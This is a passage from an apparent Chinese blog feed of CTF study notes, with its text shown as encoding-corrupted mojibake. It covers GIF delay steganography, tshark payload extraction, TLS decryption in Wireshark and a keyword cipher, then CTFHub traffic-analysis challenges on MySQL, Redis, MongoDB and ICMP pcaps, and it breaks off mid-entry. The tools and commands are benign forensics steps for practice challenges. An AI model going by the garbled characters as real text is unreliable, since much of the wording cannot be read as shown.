title="æ—¶é—´éšå†™ï¼ˆgifï¼‰"></a>æ—¶é—´éšå†™ï¼ˆgifï¼‰</h2><p><strong>ä»‹ç»ï¼š</strong> gifå›¾ç‰‡æ¯ä¸€å¸§åŠ¨ç”»ä¹‹é—´çš„<strong>å»¶è¿Ÿæ—¶é—´</strong>ã€‚</p><p><strong>æ–¹æ³•ï¼š</strong> <code>identify -format &quot;%T&quot; flag.gif</code> æ¥æå–å»¶è¿Ÿæ—¶é—´ã€‚</p><p><strong>å¸¸è§ï¼š</strong> å¸¸è§æƒ…å†µæ˜¯æŠŠé«˜å»¶è¿Ÿè®°ä¸ºâ€˜1â€™ï¼Œä½å»¶è¿Ÿè®°ä¸ºâ€˜0â€™</p><h2 id="åè®®ä¸­ä¼ è¾“æ•°æ®"><a href="#åè®®ä¸­ä¼ è¾“æ•°æ®" class="headerlink" title="åè®®ä¸­ä¼ è¾“æ•°æ®"></a>åè®®ä¸­ä¼ è¾“æ•°æ®</h2><p><strong>ä»‹ç»ï¼š</strong> åœ¨åè®®ä¼ è¾“ä¸­ï¼Œå¦‚ICMPå¯èƒ½æ¯æ¬¡ä¼ è¾“<strong>å°‘é‡æ•°æ®</strong>ï¼Œä½†æ‹¼æ¥èµ·æ¥å¯èƒ½æ˜¯<strong>ç‰¹æ®Šæ–‡ä»¶</strong></p><p><strong>æå–æ–¹æ³•ï¼š</strong> <code>tshark</code></p><p><code>tshark -r out.pcap -T fields -e data &gt; out.txt</code> ï¼Œä¼šå°†æµé‡ä¼ è¾“ä¸­çš„æ•°æ®æå–å‡ºæ¥ã€‚</p><h2 id="TLSç§é’¥æµé‡åˆ†æ"><a href="#TLSç§é’¥æµé‡åˆ†æ" class="headerlink" title="TLSç§é’¥æµé‡åˆ†æ"></a>TLSç§é’¥æµé‡åˆ†æ</h2><p><strong>æ³¨æ„ï¼š</strong> è‹¥æµé‡ä¸­å‡ºç°<code>FTPã€SMTPã€TCPã€TSL</code>ç­‰åè®®ï¼Œä¸”å¾ˆå¤šè¿½è¸ªæµå‡ºç°ä¹±ç ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯è®©æ‰¾ç§é’¥keyå»è§£å¯†TSLã€‚</p><p><strong>æ­¥éª¤ï¼š</strong></p><ul><li>æ‰¾ç§é’¥ï¼Œæ ¼å¼ä¸º</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN RSA PRIVATE KEY-----<br>XXXXXXX<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><ul><li>åœ¨wiresharkçš„<strong>é¦–é€‰é¡¹</strong>ä¸­æ·»åŠ TLSç§é’¥ï¼Œç„¶åè¿½è¸ª<strong>TLSæµ</strong>æ¥æ‰¾ä¿¡æ¯ã€‚</li></ul><h2 id="å…³é”®å­—å¯†ç "><a href="#å…³é”®å­—å¯†ç " class="headerlink" title="å…³é”®å­—å¯†ç "></a>å…³é”®å­—å¯†ç </h2><p><strong>ä»‹ç»ï¼š</strong> å¤å…¸å¯†ç ï¼Œå±äºæ›¿æ¢å¯†ç ã€‚<br><strong>ç‰¹ç‚¹ï¼š</strong> ç»“æ„ä¸å˜ï¼Œå˜æ¢å‰åå…¨æ˜¯å­—æ¯ï¼Œè€Œä¸”å¤§å°å†™ä¸€è‡´ï¼Œå¤šä¸ºå¤§å†™ã€‚<br><strong>å®ç°ä¸¾ä¾‹ï¼š</strong> </p><ul><li>æ˜æ–‡ï¼š<code>HELLO</code></li><li>å…³é”®å­—ï¼š<code>KEYWORD</code></li><li>å¯†æ–‡ï¼šå…ˆæ±‚æ›¿æ¢è¡¨ï¼Œå°†å…³é”®å­—å»é‡ï¼Œä»å­—æ¯è¡¨æå‡ºæ¥ï¼Œæ”¾åœ¨æ–°è¡¨æœ€å‰é¢ã€‚</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br>    â†“  â†“   â†“  â†“<br>KEYWORDABCFGHIJLMNPQSTUVXZ<br></code></pre></td></tr></table></figure><p>å¯¹åº”å­—æ¯æ›¿æ¢åå°±æ˜¯å¯†æ–‡ï¼Œåœ¨æœ¬ä¾‹ä¸­æ›¿æ¢åï¼Œå¾—åˆ°<code>AOGGJ</code>ã€‚</p><h2 id="å›¾ç‰‡æ‹¼æ¥-å¤ä½"><a href="#å›¾ç‰‡æ‹¼æ¥-å¤ä½" class="headerlink" title="å›¾ç‰‡æ‹¼æ¥+å¤ä½"></a>å›¾ç‰‡æ‹¼æ¥+å¤ä½</h2><p><strong>æ‹¼æ¥å·¥å…·ï¼š</strong> <code>montage</code><br><strong>å®‰è£…ï¼š</strong> <code>sudo apt-get install imagemagick</code><br><strong>ä½¿ç”¨ï¼š</strong> <code>montage *.jpg -tile 12x10 -geometry 200x100+0+0 flag.jpg</code><br><code>*.jpg</code>ï¼šè¡¨ç¤ºå½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰<code>jpg</code>å›¾ç‰‡<br><code>12x10 </code>ï¼šè¡¨ç¤ºåˆæˆåä¸ºå®½12å¼ å›¾ç‰‡ï¼Œé«˜10å¼ å›¾ç‰‡<br><code>200x100+0+0</code>ï¼šè¡¨ç¤ºæ¯å¼ å°å›¾ç‰‡å®½200åƒç´ ï¼Œé«˜100åƒç´ ï¼Œ+0+0è¡¨ç¤ºå®½é«˜æ–¹å‘é—´éš™éƒ½ä¸º0ã€‚</p><p><strong>å¤ä½å·¥å…·ï¼š</strong> <code>gaps</code><br><strong>å®‰è£…ï¼šï¼ˆå»ºè®®python3.9ç‰ˆæœ¬ï¼‰</strong> </p><ul><li><strong>è·å–é¡¹ç›®</strong>ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/nemanja-m/gaps.git<br><span class="hljs-built_in">cd</span> gaps<br></code></pre></td></tr></table></figure><ul><li><strong>å®‰è£…éœ€æ±‚ï¼š</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">poetry install<br></code></pre></td></tr></table></figure><ul><li><strong>æœ¬åœ°å®‰è£…é¡¹ç›®ï¼š</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install .<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ï¼š</strong></p><ul><li>æ‰“ä¹±</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gaps create images/pillars.jpg puzzle.jpg --size=64<br></code></pre></td></tr></table></figure><ul><li>å¤ä½</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gaps run puzzle.jpg solution.jpg --generations=20 --population=600<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHubå­¦ä¹ æ—¥è®°</title>
    <link href="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <url>/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ä¸€ã€æµé‡åˆ†æ"><a href="#ä¸€ã€æµé‡åˆ†æ" class="headerlink" title="ä¸€ã€æµé‡åˆ†æ"></a>ä¸€ã€æµé‡åˆ†æ</h2><h3 id="1ã€æ•°æ®åº“ç±»æµé‡"><a href="#1ã€æ•°æ®åº“ç±»æµé‡" class="headerlink" title="1ã€æ•°æ®åº“ç±»æµé‡"></a>1ã€æ•°æ®åº“ç±»æµé‡</h3><h4 id="1ï¼‰MySQLæµé‡"><a href="#1ï¼‰MySQLæµé‡" class="headerlink" title="1ï¼‰MySQLæµé‡"></a>1ï¼‰MySQLæµé‡</h4><p><strong>é¢˜ç›®ï¼š</strong></p><p>ä¸€ä»½åä½mysql.pcapçš„æ–‡ä»¶</p><p><strong>ä¸ªäººæ€è·¯ï¼š</strong></p><p>ä½¿ç”¨Wiresharkæ‰“å¼€ï¼Œå‘ç°å¤šç§ç±»å‹çš„æµé‡å¦‚SSHï¼ŒTCPï¼ŒARPï¼ŒMySQLï¼Œè”ç³»é¢˜ç›®ï¼Œå¯¹MySQLæµé‡è¿›è¡Œè¿½è¸ªï¼Œå‘ç°ä¸èƒ½å¾ˆå¿«å‡ºç»“æœã€‚</p><p>ç„¶åå¯¹å­—ç¬¦ä¸²è¿›è¡Œæœç´¢ï¼Œå°è¯•æœç´¢â€flagâ€,â€ctfâ€ç­‰å­—ç¬¦ä¸²ï¼Œå‘ç°æ‰¾åˆ°flagã€‚</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/1.png"></p><p><strong>ç ”ç©¶å­¦ä¹ ï¼š</strong></p><p>å‚è€ƒç½‘ä¸Šçš„ä¸€å¼ å…³äºMySQLçš„å›¾</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/2.png"></p><p>ä¹Ÿå°±æ˜¯è¯´Mysqlå»ºç«‹è¿æ¥çš„è¿‡ç¨‹åŒ…æ‹¬<strong>ç™»å½•</strong>å’Œ<strong>æŸ¥è¯¢</strong>é˜¶æ®µã€‚å¯¹MySQLåè®®æµé‡è¿›è¡Œè¿‡æ»¤ä¹‹åï¼Œå¾—åˆ°</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/3.png"></p><p>ç°åœ¨åˆ†æå¯ä»¥çŸ¥é“ï¼Œå‰åŠéƒ¨åˆ†æ˜¯ç™»å½•é˜¶æ®µï¼Œè¿›è¡Œäº†ä¸‰æ¬¡ç™»å½•å°è¯•ï¼Œå‰ä¸¤æ¬¡å¤±è´¥ï¼Œæœ€åä¸€æ¬¡æˆåŠŸï¼›æ¥ç€è¿›è¡Œå¯¹å…³äºuserçš„versionã€databaseã€tableè¿›è¡Œäº†æŸ¥è¯¢ï¼Œæœ€åæŸ¥è¯¢åˆ°ä¹‹åå¯¹æ•°æ®è¿›è¡Œäº†åˆ é™¤ã€‚</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/4.png"></p><p>æœ€åå¯¹flagæ‰€åœ¨ä½ç½®çš„æ€è€ƒï¼Œä»ç½‘ä¸Šäº†è§£åˆ°ï¼Œè¿™ä¸ªflagçš„è®¾ç«‹ä½ç½®é€šå¸¸æ˜¯ç™»å½•IPï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯æ”»å‡»è€…çš„IPåœ°å€ã€‚</p><h4 id="2ï¼‰Redisæµé‡"><a href="#2ï¼‰Redisæµé‡" class="headerlink" title="2ï¼‰Redisæµé‡"></a>2ï¼‰Redisæµé‡</h4><p><strong>é¢˜ç›®ï¼š</strong></p><p>ä¸€ä¸ªåä¸ºredis.pcapçš„æµé‡åŒ…</p><p><strong>ä¸ªäººæ€è·¯ï¼š</strong></p><p>é€šè§£æ–¹æ³•ï¼ŒWiresharkæ‰“å¼€ä¹‹åï¼Œç›´æ¥æœç´¢â€ctfhubâ€œã€â€flagâ€œç­‰å…³é”®è¯ï¼Œå‘ç°æœåˆ°åƒæ˜¯flagçš„ä¸œè¥¿ï¼Œä½†æ˜¯ä¸å®Œæ•´ï¼Œçœ‹åˆ°flag2ä¹‹åæƒ³åˆ°åº”è¯¥æ˜¯æ‹¼æ¥flagã€‚</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/5.png"></p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/6.png"></p><p>ç›´æ¥å°±å¾—åˆ°äº†å®Œæ•´flag</p><p><strong>ç ”ç©¶å­¦ä¹ ï¼š</strong></p><p>ä½¿ç”¨NoSQLï¼ˆéå…³ç³»å‹æ•°æ®åº“ï¼‰è¿›è¡Œå­˜å‚¨ï¼Œ</p><blockquote><p>SQLï¼ˆå…³ç³»å‹æ•°æ®åº“ï¼‰ï¼š<br>åŸºäºè¡¨æ ¼ï¼ˆTableï¼‰å’Œå…³ç³»ï¼ˆRelationshipï¼‰æ¨¡å‹ï¼Œæ•°æ®å­˜å‚¨åœ¨è¡Œï¼ˆRowï¼‰å’Œåˆ—ï¼ˆColumnï¼‰ä¸­ã€‚<br>å¼ºè°ƒæ•°æ®çš„ç»“æ„åŒ–å’Œä¸€è‡´æ€§ï¼Œé€šè¿‡å…³ç³»è¡¨ä¹‹é—´çš„å¤–é”®ï¼ˆForeign Keyï¼‰æ¥å®ç°æ•°æ®å…³è”ã€‚<br>ç¤ºä¾‹ï¼šMySQLã€PostgreSQLã€Oracleã€‚</p></blockquote><blockquote><p>NoSQLï¼ˆéå…³ç³»å‹æ•°æ®åº“ï¼‰ï¼š<br>æ•°æ®æ¨¡å‹å¤šæ ·ï¼Œå¸¸è§çš„æœ‰é”®å€¼å­˜å‚¨ï¼ˆKey-Valueï¼‰ã€æ–‡æ¡£å­˜å‚¨ï¼ˆDocumentï¼‰ã€åˆ—å­˜å‚¨ï¼ˆColumnï¼‰ã€å›¾å­˜å‚¨ï¼ˆGraphï¼‰ç­‰ã€‚<br>ä¸ä¾èµ–å›ºå®šçš„è¡¨æ ¼ç»“æ„ï¼Œæ•°æ®å­˜å‚¨å½¢å¼æ›´åŠ çµæ´»ã€‚<br>ç¤ºä¾‹ï¼šMongoDBï¼ˆæ–‡æ¡£å­˜å‚¨ï¼‰ã€Redisï¼ˆé”®å€¼å­˜å‚¨ï¼‰ã€Cassandraï¼ˆåˆ—å­˜å‚¨ï¼‰ã€Neo4jï¼ˆå›¾å­˜å‚¨ï¼‰ã€‚</p></blockquote><h4 id="3ï¼‰MongoDBæµé‡"><a href="#3ï¼‰MongoDBæµé‡" class="headerlink" title="3ï¼‰MongoDBæµé‡"></a>3ï¼‰MongoDBæµé‡</h4><p><strong>é¢˜ç›®ï¼š</strong></p><p>ä¸€ä¸ªåä¸ºmongodb.pcapçš„æ–‡ä»¶</p><p><strong>ä¸ªäººæ€è·¯ï¼š</strong></p><p>ä»ç„¶æ˜¯ç”¨Wiresharkæ‰“å¼€ä¹‹åï¼Œè¿‡æ»¤MongoDBæµé‡ï¼Œç›´æ¥æœç´¢â€œctfhubâ€ï¼Œä¸€ä¸ªä¸€ä¸ªå®¡è®¡ä¾¿èƒ½æ‰¾åˆ°flag</p><p><img src="/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/7.png"></p><p><strong>ç ”ç©¶å­¦ä¹ ï¼š</strong></p><p>ä½¿ç”¨NoSQLè¿›è¡Œæ–‡æ¡£å­˜å‚¨ï¼ŒMongoDBä½¿ç”¨ç±»ä¼¼äºJSONçš„æŸ¥è¯¢è¯­æ³•ã€‚</p><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="4ï¼‰Dataï¼ˆICMPï¼‰"><a href="#4ï¼‰Dataï¼ˆICMPï¼‰" class="headerlink" title="4ï¼‰Dataï¼ˆICMPï¼‰"></a>4ï¼‰Dataï¼ˆICMPï¼‰</h4><p><strong>é¢˜ç›®ï¼š</strong></p><p>ping ä¹Ÿå¯ä»¥æºå¸¦æ•°æ® ï¼Ÿä¸€ä¸ªåä¸ºicmp_data.pcapçš„æµé‡åŒ…</p><p><strong>ä¸ªäººæ€è·¯ï¼š</strong></p><p>ä½¿ç”¨Wiresharkæ‰“å¼€ï¼Œè¿‡æ»¤ICMPæµé‡ï¼ŒæŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°ç»“å°¾æœ‰å¾ˆå¤šWWWâ€¦â€¦ï¼Œæœç´¢å¸¸è§å­—ç¬¦ä¸²æ— æœï¼Œåœ¨ç¿»åŠ¨æ—¶å‘ç°æ¯æ¡æµé‡çš„å­—ç¬¦ä¸²ä¸­éƒ½æœ‰A<em>WWWWâ€¦â€¦çš„ç»“æ„ï¼ˆåªæœ‰</em>ä»£è¡¨çš„å­—ç¬¦æ”¹å˜ï¼‰ï¼Œä»å¤´å¼€å§‹çœ‹ï¼Œå‘ç°æ¯æ¡â€œreplyâ€çš„å­—ç¬¦æ„æˆâ€œctfhub{â€¦â€¦}â€ï¼Œä¸€ä¸ªä¸€ä¸ªè®°å½•ä¸‹æ¥ï¼Œå¾—åˆ°flagã€‚</p><p><a href="https://ramoor.github.io/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/8.png"><img src="https://ramoor.github.io/2025/02/17/CTFHub%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/8.png"></a></p><p><strong>ç ”ç©¶å­¦ä¹ ï¼š</strong></p><ul><li><strong>ICMP</strong>ï¼ˆInternet Control Message Protocolï¼Œäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰æ˜¯ä¸€ç§ç½‘ç»œå±‚åè®®ï¼Œä¸»è¦ç”¨äºåœ¨IPç½‘ç»œä¸­ä¼ é€’æ§åˆ¶å’Œé”™è¯¯ä¿¡æ¯ã€‚å®ƒå¸¸ç”¨äºç½‘ç»œè®¾å¤‡ä¹‹é—´çš„é€šä¿¡ï¼Œå¸®åŠ©è¿›è¡Œç½‘ç»œæ•…éšœæ’é™¤ã€é”™è¯¯æŠ¥å‘Šå’Œç½‘ç»œç®¡ç†ã€‚</li></ul><blockquote><ul><li><strong>PING åœ°å€æ—¶ICMPåè®®æµç¨‹</strong></li></ul><p><strong>ä¸€ã€å‘èµ·æ–¹å‘é€ ICMP Echo Request</strong></p><p>å½“ç”¨æˆ·æ‰§è¡ŒÂ <code>ping</code>Â å‘½ä»¤æ—¶ï¼ˆä¾‹å¦‚Â <code>ping &lt;IPåœ°å€&gt;</code>ï¼‰ï¼Œå‘èµ·æ–¹ï¼ˆé€šå¸¸æ˜¯æœ¬åœ°ä¸»æœºï¼‰ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ol><li><p><strong>æ„é€  ICMP æ•°æ®åŒ…</strong>ï¼š</p><ul><li><p><strong>ç±»å‹ï¼ˆTypeï¼‰</strong>ï¼šè®¾ç½®ä¸ºÂ <code>8</code>ï¼Œè¡¨ç¤º ICMP Echo Requestã€‚</p></li><li><p><strong>ä»£ç ï¼ˆCodeï¼‰</strong>ï¼šè®¾ç½®ä¸ºÂ <code>0</code>ã€‚</p></li><li><p><strong>æ ¡éªŒå’Œï¼ˆChecksumï¼‰</strong>ï¼šè®¡ç®— ICMP æ•°æ®åŒ…çš„æ ¡éªŒå’Œï¼Œç”¨äºæ•°æ®å®Œæ•´æ€§éªŒè¯ã€‚</p></li><li><p><strong>æ ‡è¯†ç¬¦ï¼ˆIdentifierï¼‰</strong>ï¼šé€šå¸¸æ˜¯ä¸€ä¸ªéšæœºå€¼ï¼Œç”¨äºåŒºåˆ†ä¸åŒçš„Â <code>ping</code>Â è¯·æ±‚ã€‚</p></li><li><p><strong>åºåˆ—å·ï¼ˆSequence Numberï¼‰</strong>ï¼šä»Â <code>0</code>Â å¼€å§‹ï¼Œæ¯æ¬¡å‘é€é€’å¢ï¼Œç”¨äºè·Ÿè¸ªè¯·æ±‚å’Œå“åº”çš„å¯¹åº”å…³ç³»ã€‚</p></li><li><p><strong>æ•°æ®éƒ¨åˆ†</strong>ï¼šé€šå¸¸åŒ…å«ä¸€äº›å¡«å……æ•°æ®ï¼Œå¦‚æ—¶é—´æˆ³æˆ–éšæœºå­—èŠ‚ï¼Œç”¨äºæµ‹é‡å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰ã€‚</p></li></ul></li><li><p><strong>å°è£…åˆ° IP æ•°æ®åŒ…</strong>ï¼š</p><ul><li><p>ICMP æ•°æ®åŒ…è¢«å°è£…åˆ° IP æ•°æ®åŒ…ä¸­ï¼Œç›®æ ‡åœ°å€æ˜¯ç”¨æˆ·æŒ‡å®šçš„ IP åœ°å€ã€‚</p></li><li><p>IP å¤´éƒ¨åŒ…å«æº IP åœ°å€ï¼ˆå‘èµ·æ–¹çš„ IPï¼‰å’Œç›®æ ‡ IP åœ°å€ï¼ˆè¢«Â <code>ping</code>Â çš„ IPï¼‰ã€‚</p></li></ul></li><li><p><strong>å‘é€æ•°æ®åŒ…</strong>ï¼š</p><ul><li>å‘èµ·æ–¹é€šè¿‡ç½‘ç»œæ¥å£å°†å°è£…å¥½çš„ IP æ•°æ®åŒ…å‘é€åˆ°ç›®æ ‡ä¸»æœºã€‚</li></ul></li></ol></blockquote><blockquote><p><strong>äºŒã€ç›®æ ‡ä¸»æœºæ¥æ”¶ ICMP Echo Request</strong></p><p>ç›®æ ‡ä¸»æœºæ”¶åˆ° ICMP Echo Request æ•°æ®åŒ…åï¼Œä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ol><li><p><strong>è§£æ ICMP æ•°æ®åŒ…</strong>ï¼š</p><ul><li><p>æ£€æŸ¥ ICMP ç±»å‹æ˜¯å¦ä¸ºÂ <code>8</code>ï¼ˆEcho Requestï¼‰ã€‚</p></li><li><p>éªŒè¯æ ¡éªŒå’Œæ˜¯å¦æ­£ç¡®ï¼Œä»¥ç¡®ä¿æ•°æ®å®Œæ•´æ€§ã€‚</p></li></ul></li><li><p><strong>æ„é€  ICMP Echo Reply</strong>ï¼š</p><ul><li><p><strong>ç±»å‹ï¼ˆTypeï¼‰</strong>ï¼šè®¾ç½®ä¸ºÂ <code>0</code>ï¼Œè¡¨ç¤º ICMP Echo Replyã€‚</p></li><li><p><strong>ä»£ç ï¼ˆCodeï¼‰</strong>ï¼šè®¾ç½®ä¸ºÂ <code>0</code>ã€‚</p></li><li><p><strong>æ ¡éªŒå’Œï¼ˆChecksumï¼‰</strong>ï¼šé‡æ–°è®¡ç®—æ ¡éªŒå’Œã€‚</p></li><li><p><strong>æ ‡è¯†ç¬¦ï¼ˆIdentifierï¼‰</strong>ï¼šä¿æŒä¸æ”¶åˆ°çš„ Echo Request ç›¸åŒã€‚</p></li><li><p><strong>åºåˆ—å·ï¼ˆSequence Numberï¼‰</strong>ï¼šä¿æŒä¸æ”¶åˆ°çš„ Echo Request ç›¸åŒã€‚</p></li><li><p><strong>æ•°æ®éƒ¨åˆ†</strong>ï¼šä¿æŒä¸æ”¶åˆ°çš„ Echo Request çš„æ•°æ®éƒ¨åˆ†ä¸€è‡´ã€‚</p></li></ul></li><li><p><strong>å°è£…åˆ° IP æ•°æ®åŒ…</strong>ï¼š</p><ul><li>å°† ICMP Echo Reply æ•°æ®åŒ…å°è£…åˆ° IP æ•°æ®åŒ…ä¸­ï¼Œç›®æ ‡åœ°å€æ˜¯å‘èµ·æ–¹çš„ IP åœ°å€ã€‚</li></ul></li><li><p><strong>å‘é€æ•°æ®åŒ…</strong>ï¼š</p><ul><li>ç›®æ ‡ä¸»æœºå°†å°è£…å¥½çš„ IP æ•°æ®åŒ…å‘é€å›å‘èµ·æ–¹</li></ul></li></ol></blockquote><blockquote><p><strong>ä¸‰ã€å‘èµ·æ–¹æ¥æ”¶ ICMP Echo Reply</strong></p><p>å‘èµ·æ–¹æ”¶åˆ° ICMP Echo Reply æ•°æ®åŒ…åï¼Œä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ol><li><p><strong>è§£æ ICMP æ•°æ®åŒ…</strong>ï¼š</p><ul><li><p>æ£€æŸ¥ ICMP ç±»å‹æ˜¯å¦ä¸ºÂ <code>0</code>ï¼ˆEcho Replyï¼‰ã€‚</p></li><li><p>éªŒè¯æ ¡éªŒå’Œæ˜¯å¦æ­£ç¡®ã€‚</p></li><li><p>æ£€æŸ¥æ ‡è¯†ç¬¦å’Œåºåˆ—å·æ˜¯å¦ä¸ä¹‹å‰å‘é€çš„ Echo Request åŒ¹é…ã€‚</p></li></ul></li><li><p><strong>è®¡ç®—å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰</strong>ï¼š</p><ul><li>é€šè¿‡æ¯”è¾ƒå‘é€æ—¶é—´å’Œæ¥æ”¶æ—¶é—´ï¼Œè®¡ç®—å‡ºæ•°æ®åŒ…çš„å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰ï¼Œå¹¶æ˜¾ç¤ºåœ¨Â <code>ping</code>Â å‘½ä»¤çš„è¾“å‡ºä¸­ã€‚</li></ul></li><li><p><strong>è¾“å‡ºç»“æœ</strong>ï¼š</p><ul><li><p>å¦‚æœæˆåŠŸæ”¶åˆ° Echo Replyï¼Œ<code>ping</code>Â å‘½ä»¤ä¼šè¾“å‡ºç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š</p><p><code>Reply from &lt;ç›®æ ‡IP&gt;: bytes=32 time=10ms TTL=64</code></p></li><li><p>å¦‚æœåœ¨è¶…æ—¶æ—¶é—´å†…æœªæ”¶åˆ°å“åº”ï¼Œä¼šè¾“å‡ºï¼š</p><p><code>Request timed out.</code></p></li></ul></li></ol></blockquote><blockquote><p><strong>å››ã€å¼‚å¸¸æƒ…å†µ</strong></p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ<code>ping</code>Â å‘½ä»¤å¯èƒ½ä¼šæ”¶åˆ°å…¶ä»–ç±»å‹çš„ ICMP æ¶ˆæ¯ï¼Œä¾‹å¦‚ï¼š</p><ol><li><p><strong>ç›®æ ‡ä¸å¯è¾¾ï¼ˆDestination Unreachableï¼‰</strong>ï¼š</p><ul><li><p>å¦‚æœç›®æ ‡ä¸»æœºä¸å¯è¾¾ï¼Œä¸­é—´è·¯ç”±å™¨å¯èƒ½ä¼šå‘é€ ICMP ç±»å‹Â <code>3</code>ï¼ˆDestination Unreachableï¼‰æ¶ˆæ¯ï¼Œä»£ç å¯èƒ½ä¸ºï¼š</p><ul><li><p><code>0</code>ï¼šç½‘ç»œä¸å¯è¾¾ã€‚</p></li><li><p><code>1</code>ï¼šä¸»æœºä¸å¯è¾¾ã€‚</p></li><li><p><code>6</code>ï¼šç›®çš„ç½‘ç»œæœªçŸ¥ã€‚</p></li><li><p><code>7</code>ï¼šç›®çš„ä¸»æœºæœªçŸ¥ã€‚</p></li></ul></li></ul></li><li><p><strong>è¶…æ—¶ï¼ˆTime Exceededï¼‰</strong>ï¼š</p><ul><li>å¦‚æœæ•°æ®åŒ…çš„ TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰è€—å°½ï¼Œä¸­é—´è·¯ç”±å™¨ä¼šå‘é€ ICMP ç±»å‹Â <code>11</code>ï¼ˆTime Exceededï¼‰æ¶ˆæ¯ï¼Œä»£ç ä¸ºÂ <code>0</code>ï¼ˆTTL è¶…æ—¶ï¼‰ã€‚</li></ul></li></ol></blockquote><blockquote><ul><li><strong>ICMP æ•°æ®åŒ…ç»“æ„</strong></li></ul><p>ICMP æ•°æ®åŒ…çš„ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">0                   1                   2                   3<br><span class="hljs-section">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|     ç±»å‹     |     ä»£ç       |          æ ¡éªŒå’Œ           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|        æ ‡è¯†ç¬¦        |       åºåˆ—å·        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                      æ•°æ®éƒ¨åˆ† ...</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-Length-ICMP"><a href="#5-Length-ICMP" class="headerlink" title="5) Length (ICMP)"></a>5) Length (ICMP)</h4><p><strong>é¢˜ç›®ï¼š</strong></p><p>ä¸€ä¸ªicmp_len.pcapæ–‡ä»¶</p><p><strong>ä¸ªäººæ€è·¯ï¼š</strong></p><p>ä½¿ç”¨Wiresharkæ‰“å¼€ï¼Œè¿‡æ»¤ICMPæµé‡ï¼Œæœç´¢å¸¸è§å­—ç¬¦ä¸²æ— 